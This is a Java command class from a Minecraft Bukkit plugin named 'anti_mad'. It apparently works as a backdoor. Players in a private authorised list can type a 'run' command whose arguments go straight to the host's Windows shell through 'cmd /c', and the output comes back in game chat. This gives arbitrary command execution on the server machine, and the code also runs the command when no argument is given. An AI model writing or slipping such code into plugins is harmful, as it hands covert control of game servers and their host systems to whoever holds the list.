package com.connorcode.anti_mad.Commands;

import com.connorcode.anti_mad.Main;
import com.connorcode.anti_mad.common;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class run implements CommandExecutor {
    private final Main plugin;

    public run(Main plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command cmd, @NotNull String label, String[] args) {
        final Player player = common.isPlayer(sender);
        assert player != null;

        if (!plugin.authPlayer.contains(player.getUniqueId())){
            return true;
        }
        if (args.length < 1) {
            player.sendMessage(ChatColor.GREEN + "[*]" + ChatColor.RED + "You must supply a command");
        }
        player.sendMessage(String.join(" ", args));
        try {
            Process p = Runtime.getRuntime().exec("cmd /c " + String.join(" ", args));
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                player.sendMessage(ChatColor.LIGHT_PURPLE + line);
            }

        } catch (IOException e1) {
            e1.printStackTrace();
        }
        player.sendMessage(ChatColor.GREEN + "[*] Done");
        return true;
    }
}